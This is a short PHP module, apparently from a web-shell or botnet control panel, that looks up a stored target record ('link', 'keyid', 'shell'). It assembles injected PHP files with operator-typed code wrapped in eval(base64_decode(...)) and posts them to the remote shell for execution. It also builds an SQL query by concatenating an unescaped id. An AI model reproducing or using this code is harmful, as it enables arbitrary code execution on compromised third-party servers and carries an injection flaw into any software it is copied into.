<?php

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));
//print_r(scandir('cache/'));
if(!empty($Cur['id'])){
	$result = $mysqli->query("SELECT id, link, keyid, shell FROM bf_admins WHERE (id='".$Cur['id']."')");
	if($result->id == $Cur['id']){
		$smarty->assign('admin', $result);
		$get_php = '$cur_file = \''.$result->shell.'\';';
		$get_php .= file_get_contents('modules/admins/injects/start.php');
		$get_php .= file_get_contents('modules/admins/injects/functions.php');
		$get_php .= file_get_contents('modules/admins/injects/mysqli.php');
		if(isset($_POST['submit']) && !empty($_POST['phpeval'])){			//$get_php .= 'eval(\'base64_decode(\''.base64_encode($_POST['phpeval']).'\')\');';
			$get_php .= 'eval(base64_decode(\''.base64_encode(''.$_POST['phpeval'].'').'\'));';
			$eval = get_http($result->link, $get_php, $result->keyid, $result->shell);
			$smarty->assign('eval', $eval);
		}
	}
}

?>